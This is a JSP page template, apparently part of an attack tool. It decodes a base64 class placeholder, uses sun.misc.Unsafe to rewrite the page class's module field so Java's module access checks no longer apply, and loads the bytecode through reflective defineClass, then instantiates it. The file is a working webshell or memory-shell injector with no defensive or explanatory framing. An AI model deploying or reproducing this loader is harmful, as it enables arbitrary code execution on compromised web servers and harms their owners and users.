<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %><%
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    try {
        Class base64Clz = classLoader.loadClass("java.util.Base64");
        Class decoderClz = classLoader.loadClass("java.util.Base64$Decoder");
        Object decoder = base64Clz.getMethod("getDecoder").invoke(base64Clz);
        bytecode = (byte[]) decoderClz.getMethod("decode", String.class).invoke(decoder, base64Str);
    } catch (ClassNotFoundException e) {
        Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(datatypeConverterClz, base64Str);
    }
    Object unsafe = null;
    Object rawModule = null;
    long offset = 48;
    Method getAndSetObjectM = null;
    try {
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        unsafe = unsafeField.get(null);
        rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
        Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
        Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
        offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
        getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
        getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
    } catch (Throwable ignored) {
    }
    URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
    Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
    defMethod.setAccessible(true);
    Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, bytecode, 0, bytecode.length);
    if (getAndSetObjectM != null) {
        getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
    }
    clazz.newInstance();
%>